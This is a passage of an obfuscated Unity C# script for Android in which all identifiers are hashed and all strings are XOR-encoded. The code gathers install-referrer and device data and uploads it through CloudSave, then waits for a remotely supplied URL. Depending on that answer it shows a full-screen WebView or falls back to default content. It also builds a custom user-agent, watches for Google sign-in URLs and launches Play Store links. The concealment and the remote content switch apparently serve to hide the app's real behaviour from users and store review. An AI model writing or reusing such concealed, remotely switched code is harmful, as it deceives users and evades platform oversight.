            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[12] { 10, 5, 52, 34, 37, 12, 113, 50, 33, 36, 107, 113 }, 81) + _0x56f1f529);
#endif
        }
    }

    private string _0x45d5a482 = "";
    // MAIN FLOW
    private bool _0x8982864c { get; set; }

    private string _0xdec57d0b = "";
    private async Task _0x61cdfda2()
    {
        if (await _0x612e31c2())
            return;
        if (await _0xd0af44ef())
            return;
        if (await _0xb331ec34())
            return;
        _0x5cd41a40();
        await _0xf62c38d7(_0x2109b179());
        _0x40d0c82d = await _0x24757086();
        await _0x85067f89();
    }

    private static bool IsPrivacyItemTrue(Item _0x964033c6)
    {
        if (_0x964033c6.Key != _0x6da9ed2f._0x22ec74ef(new byte[9] { 193, 219, 248, 218, 193, 222, 201, 203, 209 }, 168))
            return false;
        try
        {
            var _0x98ef8501 = _0x964033c6.Value.GetAs<object>();
            return _0x98ef8501 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    internal bool ContainsIgnoreCase(string _0xcde431d5, string _0xb4193378)
    {
        if (string.IsNullOrEmpty(_0xcde431d5) || string.IsNullOrEmpty(_0xb4193378))
            return false;
        return _0xcde431d5.IndexOf(_0xb4193378, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void _0xcb896add(string _0xbb0f0c78)
    {
        bool _0x1e7b4b1f = !string.IsNullOrEmpty(_0xbb0f0c78);
        if (_0x1e7b4b1f)
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[13] { 149, 154, 171, 189, 186, 147, 238, 157, 166, 161, 185, 244, 238 }, 206) + _0xbb0f0c78);
#endif
            }

            _0x9025b58d(_0xbb0f0c78);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[39] { 20, 27, 42, 60, 59, 18, 111, 9, 46, 35, 35, 45, 46, 44, 36, 111, 173, 201, 221, 111, 8, 46, 34, 42, 111, 103, 33, 32, 111, 41, 38, 33, 46, 35, 111, 26, 29, 3, 102 }, 79));
#endif
            }

            _0x1b48520f();
            return;
        }
    }

    internal string _0xabc20734(string _0x6e6c368f)
    {
        int _0xba7ff665 = _0x6e6c368f.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[3] { 80, 93, 4 }, 57), StringComparison.OrdinalIgnoreCase);
        if (_0xba7ff665 < 0)
            return null;
        string _0xd2739e4c = _0x6e6c368f.Substring(_0xba7ff665 + 3);
        int _0xd7911d2a = _0xd2739e4c.IndexOf('&');
        return _0xd7911d2a >= 0 ? _0xd2739e4c.Substring(0, _0xd7911d2a) : _0xd2739e4c;
    }

    private bool _0x19b6e5f1 = false;
    private void _0x5a3564f6()
    {
        if (_0xac6c517d)
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[18] { 19, 46, 63, 34, 118, 55, 58, 36, 51, 55, 50, 47, 118, 37, 62, 57, 33, 56 }, 86));
            return;
        }

        _0xbecaad9c(false);
        WLog(_0x6da9ed2f._0x22ec74ef(new byte[46] { 138, 166, 174, 169, 231, 144, 162, 165, 145, 174, 162, 176, 231, 151, 178, 180, 175, 231, 137, 168, 179, 174, 161, 174, 164, 166, 179, 174, 168, 169, 231, 239, 175, 166, 181, 163, 176, 166, 181, 162, 231, 165, 166, 164, 172, 238 }, 199));
        ++_0x0fd7820a;
        _0x091e47ca();
        if (_0x0fd7820a <= 1)
            return;
        if (_0x77830415())
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[37] { 55, 10, 27, 6, 82, 1, 25, 27, 2, 2, 23, 22, 82, 95, 76, 82, 2, 29, 2, 7, 2, 1, 82, 1, 6, 27, 30, 30, 82, 29, 2, 23, 28, 23, 22, 72, 82 }, 114) + _0xc0005a68.Count);
            return;
        }

        Application.Quit();
    }

    private string _0x3566340e;
    internal void _0xd93356b7()
    {
        Rect _0xe526724e = Screen.safeArea;
        Vector2 _0x674f5c2b = new Vector2(Screen.width, Screen.height);
        if (_0xe526724e == lastSafe && _0x674f5c2b == lastSize)
            return;
        _0xe526724e.xMin += _0xcee5444b;
        _0xe526724e.xMax -= _0x96ae2994;
        _0xe526724e.yMin += _0x1a5d58dd;
        _0xe526724e.yMax -= _0x4caa3e87;
        // Convert Unity safe area -> native WebView frame
        Rect _0xbbc72beb = new Rect(_0xe526724e.x, _0x674f5c2b.y - _0xe526724e.y - _0xe526724e.height, // Y flip for native coordinate system
 _0xe526724e.width, _0xe526724e.height);
        _0xf540acea.Frame = _0xbbc72beb;
        lastSafe = Screen.safeArea;
        lastSize = _0x674f5c2b;
    }

    public void _0x1b48520f()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[18] { 142, 129, 176, 166, 161, 136, 245, 153, 180, 160, 187, 182, 189, 245, 146, 180, 184, 176 }, 213));
#endif
        }

        _0x9ff42d58.Instance?._0xad7c50b1();
        _0x3d672026.Instance._0xb591be1b(_0x47a641fc._0x545b99d3.DEFAULT);
    }

    private Text _0xf67f17dd;
    private string _0x61702eb6 = "";
    private string _0xdbccb605()
    {
        try
        {
            using (var _0x82485bf2 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[30] { 94, 82, 80, 19, 72, 83, 84, 73, 68, 14, 89, 19, 77, 81, 92, 68, 88, 79, 19, 104, 83, 84, 73, 68, 109, 81, 92, 68, 88, 79 }, 61)))
            {
                var _0x40f97b60 = _0x82485bf2.GetStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 24, 14, 9, 9, 30, 21, 15, 58, 24, 15, 18, 13, 18, 15, 2 }, 123));
                var _0xb96c3353 = _0x40f97b60.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[21] { 111, 109, 124, 73, 120, 120, 100, 97, 107, 105, 124, 97, 103, 102, 75, 103, 102, 124, 109, 112, 124 }, 8));
                using (var _0x8c773844 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[26] { 53, 58, 48, 38, 59, 61, 48, 122, 35, 49, 54, 63, 61, 32, 122, 3, 49, 54, 7, 49, 32, 32, 61, 58, 51, 39 }, 84)))
                {
                    return _0x8c773844.CallStatic<string>(_0x6da9ed2f._0x22ec74ef(new byte[19] { 181, 183, 166, 150, 183, 180, 179, 167, 190, 166, 135, 161, 183, 160, 147, 181, 183, 188, 166 }, 210), _0xb96c3353);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private void _0xe1d811f1(string _0x6dbaf38d)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[34] { 199, 200, 249, 239, 232, 193, 188, 218, 249, 232, 255, 244, 188, 217, 228, 232, 238, 253, 188, 204, 233, 239, 244, 188, 216, 253, 232, 253, 188, 206, 253, 235, 166, 188 }, 156) + _0x6dbaf38d);
#endif
            }
        }

        var _0xab8c078e = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x6dbaf38d);
        StartCoroutine(_0xbe82c8ae(_0xab8c078e));
    }

    private string _0x8dc33c89(string _0x609eeaf0, string _0x168aa2d3)
    {
        if (string.IsNullOrEmpty(_0x168aa2d3))
            return _0x609eeaf0;
        if (_0x609eeaf0.Contains(_0x6da9ed2f._0x22ec74ef(new byte[1] { 145 }, 174)))
            return _0x609eeaf0 + _0x6da9ed2f._0x22ec74ef(new byte[8] { 72, 29, 11, 0, 10, 7, 10, 83 }, 110) + UnityWebRequest.EscapeURL(_0x168aa2d3);
        else
            return _0x609eeaf0 + _0x6da9ed2f._0x22ec74ef(new byte[8] { 64, 12, 26, 17, 27, 22, 27, 66 }, 127) + UnityWebRequest.EscapeURL(_0x168aa2d3);
    }

    private ApplicationInstallMode _0xa7912803 = ApplicationInstallMode.Unknown;
    private int _0xf883fed1 = -1;
    private async Task _0x750d75cc(string _0xafc9a364)
    {
        if (_0xdb05c46a || string.IsNullOrEmpty(_0x35308c09) || string.IsNullOrEmpty(_0xafc9a364) || _0x24862266)
            return;
        _0xdb05c46a = true;
        try
        {
            JObject _0x0d63c1d0 = BuildRandomPayload(_0xafc9a364, _0x35308c09, _0x5ec43697());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xafc9a364} payload: {_0x0d63c1d0}");
                }
#endif
            }

            var _0xe69f8426 = _0x09aa57ef(_0x0d63c1d0.ToString(), _0x35308c09);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x6da9ed2f._0x22ec74ef(new byte[4] { 225, 226, 236, 233 }, 141) + _0x35308c09, _0xe69f8426 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[24] { 92, 83, 66, 84, 83, 90, 39, 75, 104, 102, 99, 39, 119, 102, 116, 116, 39, 98, 117, 117, 104, 117, 61, 39 }, 7) + e.Message);
#endif
            }
        }
    }

    private string _0x35308c09 = "";
    private async Task<bool> _0xb331ec34()
    {
        {
#if B_LOGS
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[29] { 177, 190, 143, 153, 158, 183, 202, 163, 153, 186, 152, 131, 156, 139, 137, 147, 171, 132, 142, 185, 139, 156, 143, 142, 169, 130, 143, 137, 129 }, 234));
#endif
        }

        string _0x67a9b444 = "";
        for (int _0x2462c25d = 0; _0x2462c25d < 2; _0x2462c25d++)
        {
            if (await _0xa27640f8(1, 100))
            {
                await _0x750d75cc(_0x6da9ed2f._0x22ec74ef(new byte[7] { 70, 72, 75, 71, 79, 65, 64 }, 36));
                _0x1b48520f();
                return true;
            }

            _0x67a9b444 = await _0xea84aa52(1, 100);
            if (!string.IsNullOrEmpty(_0x67a9b444))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x67a9b444))
            {
                if (!string.IsNullOrEmpty(_0x3c18429d))
                {
                    _0x67a9b444 = _0x8dc33c89(_0x67a9b444, _0x3c18429d);
                    {
#if B_LOGS
                        Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[53] { 127, 112, 65, 87, 80, 121, 4, 103, 69, 71, 76, 65, 64, 4, 66, 77, 74, 69, 72, 113, 86, 72, 4, 83, 77, 80, 76, 4, 87, 65, 74, 64, 77, 64, 4, 198, 162, 182, 4, 87, 76, 75, 83, 4, 115, 65, 70, 114, 77, 65, 83, 30, 4 }, 36) + _0x67a9b444);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[39] { 96, 111, 94, 72, 79, 102, 27, 120, 90, 88, 83, 94, 95, 27, 93, 82, 85, 90, 87, 110, 73, 87, 27, 217, 189, 169, 27, 72, 83, 84, 76, 27, 108, 94, 89, 109, 82, 94, 76 }, 59));
#endif
                    }
                }

                _0x24862266 = true;
                _0x9025b58d(_0x67a9b444);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[44] { 196, 203, 250, 236, 235, 194, 191, 218, 231, 252, 250, 239, 235, 246, 240, 241, 191, 232, 247, 246, 243, 250, 191, 252, 247, 250, 252, 244, 246, 241, 248, 191, 236, 254, 233, 250, 251, 191, 243, 246, 241, 244, 165, 191 }, 159) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string _0xd6df64f4 = "";
    private Canvas _0x5705c2fe;
    private string _0xa346f20e = "";
    internal Rect lastSafe = Rect.zero;
    private bool _0xbbd2bc34 = false;
    private string _0x05f1cb43()
    {
        string _0xec19ba62 = _0xb53cbb25();
        if (string.IsNullOrEmpty(_0xec19ba62))
            return _0x6da9ed2f._0x22ec74ef(new byte[7] { 157, 132, 130, 143, 203, 219, 208 }, 235);
        string _0x28c4a503 = _0xec19ba62.Replace(_0x6da9ed2f._0x22ec74ef(new byte[1] { 246 }, 170), _0x6da9ed2f._0x22ec74ef(new byte[2] { 243, 243 }, 175)).Replace(_0x6da9ed2f._0x22ec74ef(new byte[1] { 57 }, 30), _0x6da9ed2f._0x22ec74ef(new byte[2] { 1, 122 }, 93));
        var _0x36ca6cc8 = Regex.Match(_0xec19ba62, _0x6da9ed2f._0x22ec74ef(new byte[12] { 160, 139, 145, 140, 142, 134, 204, 203, 191, 135, 200, 202 }, 227));
        string _0x98789b34 = _0x36ca6cc8.Success ? _0x36ca6cc8.Groups[1].Value : _0x6da9ed2f._0x22ec74ef(new byte[3] { 155, 152, 154 }, 170);
        return _0x6da9ed2f._0x22ec74ef(new byte[12] { 124, 50, 33, 58, 55, 32, 61, 59, 58, 124, 125, 47 }, 84) + _0x6da9ed2f._0x22ec74ef(new byte[8] { 149, 130, 145, 195, 150, 130, 222, 196 }, 227) + _0x28c4a503 + _0x6da9ed2f._0x22ec74ef(new byte[2] { 225, 253 }, 198) + _0x6da9ed2f._0x22ec74ef(new byte[30] { 133, 146, 129, 211, 131, 129, 156, 135, 156, 206, 189, 146, 133, 154, 148, 146, 135, 156, 129, 221, 131, 129, 156, 135, 156, 135, 138, 131, 150, 200 }, 243) + _0x6da9ed2f._0x22ec74ef(new byte[121] { 4, 23, 12, 1, 22, 11, 13, 12, 66, 6, 7, 4, 74, 13, 0, 8, 78, 9, 7, 27, 78, 20, 3, 14, 75, 25, 22, 16, 27, 25, 45, 0, 8, 7, 1, 22, 76, 6, 7, 4, 11, 12, 7, 50, 16, 13, 18, 7, 16, 22, 27, 74, 13, 0, 8, 78, 9, 7, 27, 78, 25, 5, 7, 22, 88, 4, 23, 12, 1, 22, 11, 13, 12, 74, 75, 25, 16, 7, 22, 23, 16, 12, 66, 20, 3, 14, 89, 31, 78, 1, 13, 12, 4, 11, 5, 23, 16, 3, 0, 14, 7, 88, 22, 16, 23, 7, 31, 75, 89, 31, 1, 3, 22, 1, 10, 74, 7, 75, 25, 31, 31 }, 98) + _0x6da9ed2f._0x22ec74ef(new byte[26] { 162, 163, 160, 238, 182, 180, 169, 178, 169, 234, 225, 179, 181, 163, 180, 135, 161, 163, 168, 178, 225, 234, 179, 167, 239, 253 }, 198) + _0x6da9ed2f._0x22ec74ef(new byte[52] { 30, 31, 28, 82, 10, 8, 21, 14, 21, 86, 93, 27, 10, 10, 44, 31, 8, 9, 19, 21, 20, 93, 86, 15, 27, 84, 8, 31, 10, 22, 27, 25, 31, 82, 85, 36, 55, 21, 0, 19, 22, 22, 27, 38, 85, 85, 86, 93, 93, 83, 83, 65 }, 122) + _0x6da9ed2f._0x22ec74ef(new byte[37] { 4, 5, 6, 72, 16, 18, 15, 20, 15, 76, 71, 16, 12, 1, 20, 6, 15, 18, 13, 71, 76, 71, 44, 9, 14, 21, 24, 64, 1, 18, 13, 22, 88, 12, 71, 73, 91 }, 96) + _0x6da9ed2f._0x22ec74ef(new byte[34] { 22, 23, 20, 90, 2, 0, 29, 6, 29, 94, 85, 4, 23, 28, 22, 29, 0, 85, 94, 85, 53, 29, 29, 21, 30, 23, 82, 59, 28, 17, 92, 85, 91, 73 }, 114) + _0x6da9ed2f._0x22ec74ef(new byte[30] { 236, 237, 238, 160, 248, 250, 231, 252, 231, 164, 175, 229, 233, 240, 220, 231, 253, 235, 224, 216, 231, 225, 230, 252, 251, 175, 164, 189, 161, 179 }, 136) + _0x6da9ed2f._0x22ec74ef(new byte[48] { 237, 235, 224, 226, 239, 248, 235, 185, 236, 248, 253, 164, 226, 251, 235, 248, 247, 253, 234, 163, 194, 226, 251, 235, 248, 247, 253, 163, 190, 218, 241, 235, 246, 244, 240, 236, 244, 190, 181, 239, 252, 235, 234, 240, 246, 247, 163, 190 }, 153) + _0x98789b34 + _0x6da9ed2f._0x22ec74ef(new byte[35] { 180, 238, 191, 232, 241, 225, 242, 253, 247, 169, 180, 212, 252, 252, 244, 255, 246, 179, 208, 251, 225, 252, 254, 246, 180, 191, 229, 246, 225, 224, 250, 252, 253, 169, 180 }, 147) + _0x98789b34 + _0x6da9ed2f._0x22ec74ef(new byte[238] { 179, 233, 184, 239, 246, 230, 245, 250, 240, 174, 179, 218, 251, 224, 169, 213, 171, 214, 230, 245, 250, 240, 179, 184, 226, 241, 230, 231, 253, 251, 250, 174, 179, 166, 160, 179, 233, 201, 184, 249, 251, 246, 253, 248, 241, 174, 224, 230, 225, 241, 184, 228, 248, 245, 224, 242, 251, 230, 249, 174, 179, 213, 250, 240, 230, 251, 253, 240, 179, 184, 243, 241, 224, 220, 253, 243, 252, 209, 250, 224, 230, 251, 228, 237, 194, 245, 248, 225, 241, 231, 174, 242, 225, 250, 247, 224, 253, 251, 250, 188, 189, 239, 230, 241, 224, 225, 230, 250, 180, 196, 230, 251, 249, 253, 231, 241, 186, 230, 241, 231, 251, 248, 226, 241, 188, 239, 245, 230, 247, 252, 253, 224, 241, 247, 224, 225, 230, 241, 174, 179, 245, 230, 249, 179, 184, 246, 253, 224, 250, 241, 231, 231, 174, 179, 162, 160, 179, 184, 249, 251, 246, 253, 248, 241, 174, 224, 230, 225, 241, 184, 249, 251, 240, 241, 248, 174, 179, 179, 184, 228, 248, 245, 224, 242, 251, 230, 249, 174, 179, 213, 250, 240, 230, 251, 253, 240, 179, 184, 228, 248, 245, 224, 242, 251, 230, 249, 194, 241, 230, 231, 253, 251, 250, 174, 179, 165, 160, 186, 164, 186, 164, 179, 184, 225, 245, 210, 225, 248, 248, 194, 241, 230, 231, 253, 251, 250, 174, 179 }, 148) + _0x98789b34 + _0x6da9ed2f._0x22ec74ef(new byte[117] { 82, 76, 82, 76, 82, 76, 91, 1, 85, 71, 1, 1, 71, 51, 30, 22, 25, 31, 8, 82, 24, 25, 26, 21, 18, 25, 44, 14, 19, 12, 25, 14, 8, 5, 84, 12, 14, 19, 8, 19, 80, 91, 9, 15, 25, 14, 61, 27, 25, 18, 8, 56, 29, 8, 29, 91, 80, 7, 27, 25, 8, 70, 26, 9, 18, 31, 8, 21, 19, 18, 84, 85, 7, 14, 25, 8, 9, 14, 18, 92, 9, 29, 24, 71, 1, 80, 31, 19, 18, 26, 21, 27, 9, 14, 29, 30, 16, 25, 70, 8, 14, 9, 25, 1, 85, 71, 1, 31, 29, 8, 31, 20, 84, 25, 85, 7, 1 }, 124) + _0x6da9ed2f._0x22ec74ef(new byte[5] { 83, 7, 6, 7, 21 }, 46);
    }

    private async Task _0x85067f89()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0xb53756c6 = _0x6da9ed2f._0x22ec74ef(new byte[5] { 158, 153, 148, 139, 157 }, 248);
        _0xa7a19a9f = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0xda3f68c3 = DateTime.UtcNow.Ticks.ToString();
        _0xa91de751 = "";
        JObject _0xaf513787 = BuildRandomPayload(_0xdec57d0b, _0xe17e871a, _0xd6df64f4, _0xa8d3ed49, _0x53aebe70, _0x009c2d65, _0xdb6e618e, _0x77da62ef, _0x40d0c82d, _0x61702eb6, _0xb53756c6, _0xa91de751, _0x45d5a482, _0x3bf45c36, _0xa7912803.ToString(), _0xa346f20e, _0xda3f68c3, _0xa7a19a9f, _0x35308c09, _0x6296a8c7, _0x56f1f529, _0x6ec1d510, _0x5ec43697());
        var _0xc8464edc = _0x09aa57ef(_0xaf513787.ToString(), _0x35308c09);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xaf513787}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x6da9ed2f._0x22ec74ef(new byte[7] { 49, 32, 56, 45, 46, 32, 37 }, 65) + _0x35308c09, _0xc8464edc } });
            await Task.Delay(500);
            string _0xaee043c8 = "";
            for (int _0x1d8df053 = 0; _0x1d8df053 < 20; _0x1d8df053++)
            {
                if (await _0xa27640f8(1, 1))
                {
                    await _0x750d75cc(_0x6da9ed2f._0x22ec74ef(new byte[7] { 151, 153, 154, 150, 158, 144, 145 }, 245));
                    _0x1b48520f();
                    return;
                }

                _0xaee043c8 = await _0xea84aa52(1, 500);
                if (!string.IsNullOrEmpty(_0xaee043c8))
                    break;
            }

            _0xcb896add(_0xaee043c8);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[22] { 71, 72, 89, 79, 72, 65, 60, 91, 121, 114, 121, 110, 125, 112, 60, 121, 110, 110, 115, 110, 38, 60 }, 28) + e.Message);
#endif
            }

            _0x1b48520f();
        }
    }

    private bool _0x1514241f(string _0x05e81edd, string _0x32bdb8bc)
    {
        string _0x15c53586 = _0xabc20734(_0x05e81edd);
        if (string.IsNullOrEmpty(_0x15c53586))
            _0x15c53586 = _0x32bdb8bc;
        if (_0x8838961f(_0x15c53586))
            return true;
        string _0x1470ad0a = string.IsNullOrEmpty(_0x15c53586) ? _0x6da9ed2f._0x22ec74ef(new byte[29] { 14, 18, 18, 22, 21, 92, 73, 73, 22, 10, 7, 31, 72, 1, 9, 9, 1, 10, 3, 72, 5, 9, 11, 73, 21, 18, 9, 20, 3 }, 102) : _0x6da9ed2f._0x22ec74ef(new byte[46] { 179, 175, 175, 171, 168, 225, 244, 244, 171, 183, 186, 162, 245, 188, 180, 180, 188, 183, 190, 245, 184, 180, 182, 244, 168, 175, 180, 169, 190, 244, 186, 171, 171, 168, 244, 191, 190, 175, 186, 178, 183, 168, 228, 178, 191, 230 }, 219) + _0x15c53586;
        WLog(_0x6da9ed2f._0x22ec74ef(new byte[35] { 17, 58, 32, 61, 63, 55, 30, 59, 57, 55, 114, 63, 51, 32, 57, 55, 38, 114, 52, 51, 62, 62, 48, 51, 49, 57, 114, 51, 33, 114, 37, 55, 48, 104, 114 }, 82) + _0x1470ad0a);
        return _0x9d74c32c(_0x1470ad0a);
    }

    private void _0xbecaad9c(bool _0xea2e6eb0)
    {
        _0xfb81855f();
        _0x631a365e.SetActive(_0xea2e6eb0);
        _0x778172de = _0xea2e6eb0;
        if (_0xea2e6eb0)
        {
            _0x631a365e.transform.SetAsLastSibling();
            if (_0x43a38e59 != null)
                _0x43a38e59.localRotation = Quaternion.identity;
        }
    }

    private void OnApplicationFocus(bool _0x7243b5ba)
    {
        isApplicationFocus = _0x7243b5ba;
        if (_0x7243b5ba && _0xf67969c4)
        {
            _0x6c3efd71();
        }
    }

    private bool _0x8838961f(string _0xc6d96343)
    {
        if (string.IsNullOrEmpty(_0xc6d96343))
            return false;
        try
        {
            using (var _0x3fc62654 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[30] { 214, 218, 216, 155, 192, 219, 220, 193, 204, 134, 209, 155, 197, 217, 212, 204, 208, 199, 155, 224, 219, 220, 193, 204, 229, 217, 212, 204, 208, 199 }, 181)))
            using (var _0x7006f7dd = _0x3fc62654.GetStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 77, 91, 92, 92, 75, 64, 90, 111, 77, 90, 71, 88, 71, 90, 87 }, 46)))
            using (var _0xba0edec5 = _0x7006f7dd.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[17] { 226, 224, 241, 213, 228, 230, 238, 228, 226, 224, 200, 228, 235, 228, 226, 224, 247 }, 133)))
            using (var _0xd62718a7 = _0xba0edec5.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[25] { 243, 241, 224, 216, 245, 225, 250, 247, 252, 221, 250, 224, 241, 250, 224, 210, 251, 230, 196, 245, 247, 255, 245, 243, 241 }, 148), _0xc6d96343))
            {
                if (_0xd62718a7 == null)
                    return false;
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[37] { 237, 198, 220, 193, 195, 203, 226, 199, 197, 203, 142, 194, 207, 219, 192, 205, 198, 142, 199, 192, 221, 218, 207, 194, 194, 203, 202, 142, 222, 207, 205, 197, 207, 201, 203, 148, 142 }, 174) + _0xc6d96343);
                _0xd62718a7.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[8] { 44, 41, 41, 11, 33, 44, 42, 62 }, 77), 0x10000000);
                _0x7006f7dd.Call(_0x6da9ed2f._0x22ec74ef(new byte[13] { 217, 222, 203, 216, 222, 235, 201, 222, 195, 220, 195, 222, 211 }, 170), _0xd62718a7);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private Task _0xf62c38d7(IEnumerator _0x34ccf758)
    {
        var _0x73bf7b19 = new TaskCompletionSource<bool>();
        StartCoroutine(_0x461cb6b4(_0x34ccf758, _0x73bf7b19));
        return _0x73bf7b19.Task;
    }

    private bool _0xce077226(int _0xf8d8c72f, string _0x4380de1e, string _0xaae3a558)
    {
        if (string.IsNullOrEmpty(_0xaae3a558))
            return false;
        if (!IsHttpUrl(_0xaae3a558))
            return true;
        if (string.IsNullOrEmpty(_0x4380de1e))
            return false;
        return _0x4380de1e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[20] { 93, 74, 74, 71, 91, 87, 86, 86, 93, 91, 76, 81, 87, 86, 71, 74, 93, 75, 93, 76 }, 24), StringComparison.OrdinalIgnoreCase) >= 0 || _0x4380de1e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[22] { 16, 7, 7, 10, 22, 26, 27, 27, 16, 22, 1, 28, 26, 27, 10, 7, 16, 19, 0, 6, 16, 17 }, 85), StringComparison.OrdinalIgnoreCase) >= 0 || _0x4380de1e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[21] { 61, 42, 42, 39, 59, 55, 54, 54, 61, 59, 44, 49, 55, 54, 39, 59, 52, 55, 43, 61, 60 }, 120), StringComparison.OrdinalIgnoreCase) >= 0 || _0x4380de1e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[22] { 28, 11, 11, 6, 12, 23, 18, 23, 22, 14, 23, 6, 12, 11, 21, 6, 10, 26, 17, 28, 20, 28 }, 89), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal bool IsGoogleAuthFlowUrl(string _0x2bdd742e)
    {
        if (string.IsNullOrEmpty(_0x2bdd742e))
            return false;
        return _0x2bdd742e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[19] { 174, 172, 172, 160, 186, 161, 187, 188, 225, 168, 160, 160, 168, 163, 170, 225, 172, 160, 162 }, 207), StringComparison.OrdinalIgnoreCase) >= 0 || _0x2bdd742e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[16] { 210, 208, 208, 220, 198, 221, 199, 192, 157, 212, 220, 220, 212, 223, 214, 157 }, 179), StringComparison.OrdinalIgnoreCase) >= 0 || _0x2bdd742e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[21] { 8, 0, 0, 8, 3, 10, 26, 28, 10, 29, 12, 0, 1, 27, 10, 1, 27, 65, 12, 0, 2 }, 111), StringComparison.OrdinalIgnoreCase) >= 0 || _0x2bdd742e.IndexOf(_0x6da9ed2f._0x22ec74ef(new byte[11] { 107, 127, 120, 109, 120, 101, 111, 34, 111, 99, 97 }, 12), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private bool _0x778172de = false;
    private string _0x56f1f529 = "";
    private void _0xf303fae1()
    {
        if (_0xf540acea == null)
            return;
        if (_0xbbd2bc34)
            _0xf540acea.SetUserAgent(_0xb53cbb25());
        else
            _0xf540acea.SetUserAgent("");
    }

    private string _0xda3f68c3 = "";
    private void _0x6c3efd71()
    {
        using (var _0x68c957b1 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[30] { 203, 199, 197, 134, 221, 198, 193, 220, 209, 155, 204, 134, 216, 196, 201, 209, 205, 218, 134, 253, 198, 193, 220, 209, 248, 196, 201, 209, 205, 218 }, 168)))
        using (var _0xa812831d = _0x68c957b1.GetStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 47, 57, 62, 62, 41, 34, 56, 13, 47, 56, 37, 58, 37, 56, 53 }, 76)))
        using (var _0x795c45fd = _0xa812831d.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[9] { 193, 195, 210, 239, 200, 210, 195, 200, 210 }, 166)))
        {
            if (_0x795c45fd == null)
                return;
            using (var _0x50fa960d = _0x795c45fd.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[9] { 98, 96, 113, 64, 125, 113, 119, 100, 118 }, 5)))
            {
                if (_0x50fa960d == null)
                    return;
                using (var _0xbdce6879 = new AndroidJavaObject(_0x6da9ed2f._0x22ec74ef(new byte[19] { 65, 92, 73, 0, 68, 93, 65, 64, 0, 100, 125, 97, 96, 97, 76, 68, 75, 77, 90 }, 46)))
                using (var _0x05d0614c = _0x50fa960d.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[6] { 248, 246, 234, 192, 246, 231 }, 147)))
                using (var _0x5fff347a = _0x05d0614c.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[8] { 10, 23, 6, 17, 2, 23, 12, 17 }, 99)))
                {
                    while (_0x5fff347a.Call<bool>(_0x6da9ed2f._0x22ec74ef(new byte[7] { 225, 232, 250, 199, 236, 241, 253 }, 137)))
                    {
                        string _0x28ef2b1e = _0x5fff347a.Call<string>(_0x6da9ed2f._0x22ec74ef(new byte[4] { 225, 234, 247, 251 }, 143));
                        using (var _0x2c140e19 = _0x50fa960d.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[3] { 194, 192, 209 }, 165), _0x28ef2b1e))
                        {
                            _0xbdce6879.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[3] { 84, 81, 80 }, 36), _0x28ef2b1e, _0x2c140e19);
                        }
                    }

